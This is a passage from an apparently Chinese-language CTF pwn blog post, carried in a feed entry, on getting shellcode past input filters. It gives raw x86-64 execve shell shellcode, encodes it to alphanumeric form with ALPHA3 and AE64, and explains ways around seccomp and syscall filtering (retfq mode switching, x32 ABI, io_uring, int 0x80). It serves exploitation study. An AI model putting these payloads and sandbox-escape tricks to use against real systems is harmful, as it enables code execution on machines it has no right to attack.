class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x31\xc0\xb0\x3b\x99\x0f\x05&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./sc.bin&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(sc)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ALPHA3.py x64 ascii mixedcase rdx --input=&quot;sc.bin&quot; &gt; out.bin </span><br></pre></td></tr></table></figure><p>可以选择架构、编码、限制的字符</p><h3 id="AE64">AE64</h3><p>AE64可以直接在python中导入，使用相对较为方便且限制较少</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get bytes format shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="built_in">print</span>(enc_shellcode.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="手动绕过">手动绕过</h2><p>主要是通过sub、add、xor等指令对于非字母数字指令进行加密。<br>可以先根据限制筛选出受限制后的指令列表，然后根据指令列表进行组合，从而实现绕过。</p><p>另一种方法是通过shellcode先实现write读取到shellcode的位置，然后输入新的无限制的<br>shellcode来完成绕过。</p><p><a href="https://nets.ec/Alphanumeric_shellcode">https://nets.ec/Alphanumeric_shellcode</a></p><h1 id="特定位置字符限制">特定位置字符限制</h1><p>在最近的*CTF中存在一个用浮点数输入字符，并对浮点数做限制写shellcode的题目，实际上是限制了每八位需要有两位是特定字符，这里给出两种绕过思路:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rcx, im64</span><br><span class="line">mov rcx, im32</span><br><span class="line">mov ecx, im32</span><br><span class="line">mov cl, im16</span><br></pre></td></tr></table></figure><p>这里im是可以由我们自由控制的立即数，因此我们可以通过插入这些无关指令填充来绕过限制，上面这些指令涵盖了3、4、5字节，可以灵活插入来达到需要的效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short</span><br></pre></td></tr></table></figure><p>通过jmp短跳转直接跳过中间指令，从而绕过限制</p><p>jmp指令本身只有两个字节，更为灵活。</p><h1 id="对于orw的限制">对于orw的限制</h1><p>如果程序还对orw等系统调用作出了限制呢？<br>w的限制还好说，可以通过侧信道leak出flag，而如果禁用了open，orw就  很难进行下去了。<br>但是还有一种方法。</p><h2 id="利用32位调用绕过orw">利用32位调用绕过orw</h2><p>x86与x64的syscall number是不一样的，如果能够跳转到32位执行相应的shellcode，就可一绕过限制。</p><p><strong>x86</strong> <strong>sys_number</strong></p><p>| sys_number  |   |   |   |   |<br>|—|—|—|—|—|—|<br>|3|read|0x03|unsigned int fd|char *buf|size_t count|<br>|4|write|0x04|unsigned int fd|const char *buf|size_t count|<br>|5|open|0x05|const char *filename|int flags|umode_t mode|</p><p>而程序是由32位还是64位执行是由cs寄存器决定的，而retfq指令可以对其作出更改，从而切换寄存器状态，所以可以由此实现orw。</p><p>值得注意的是, 对于32位程序, 由于kernel 也要对其作出相应支持, 所以内核代码中有一个操作系统层面的arch判断, personality, 这会影响mmap之类的操作</p><h2 id="x32-ABI">x32 ABI</h2><p>x32 ABI 是一个应用程序二进制接口 (ABI)，也是 Linux 内核的接口之一。 x32 ABI 在 Intel 和 AMD 64 位硬件上提供 32 位整数、长整数和指针。</p><p>可以通过 查看内核源代码 unistd_x32.h 查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/src/kernels/6.4.7-200.fc38.x86_64/arch/x86/include/generated/uapi/asm/unistd_x32.h</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _UAPI_ASM_UNISTD_X32_H              </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _UAPI_ASM_UNISTD_X32_H                </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)          </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)           </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)                                 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close (__X32_SYSCALL_BIT + 3)  </span></span><br></pre></td></tr></table></figure><p>即可以通过0x40000000+syscall_number 来调用一些系统调用。所以可以绕过对syscall的限制。</p><p>不过这个特性似乎在大多数发行版中不受支持。</p><h2 id="io-uring">io_uring</h2><p>io_uring 本身可以实现所有orw乃至socket连接操作, 在linux5.xx最少需要<code>mmap</code>和 <code>io_uring_setup</code> 两个syscall, 之后增加了 <code>IORING_SETUP_NOMMAP</code> 则可以只用一个syscall来实现orw</p><h1 id="对于syscall指令的过滤">对于syscall指令的过滤</h1><ul><li>vdso</li><li>sysenter</li><li>int 80</li></ul><h1 id="tricks">tricks</h1><ul><li>对于一些题目，对shellcode的检查用到了strlen，那么可以通过先使用一些存在NULL截断的指令，从而使得后面的字符串绕过限制。</li><li>在无法获取shellcode运行地址时，可以运行syscall，运行后，rcx会被改写为下一条指令的地址</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Basic&quot;&gt;Basic&lt;/h1&gt;
&lt;p&gt;首先给出两个常用shellcode仓库，可以检索需要的shellcode&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://shell-storm.org/shellcode/index.html&quot;&gt;shellcode database&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/google-hacking-database&quot;&gt;exploit-db&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="pwn" scheme="https://v3rdant.cn/tags/pwn/"/>
    
  </entry>
  
</feed>
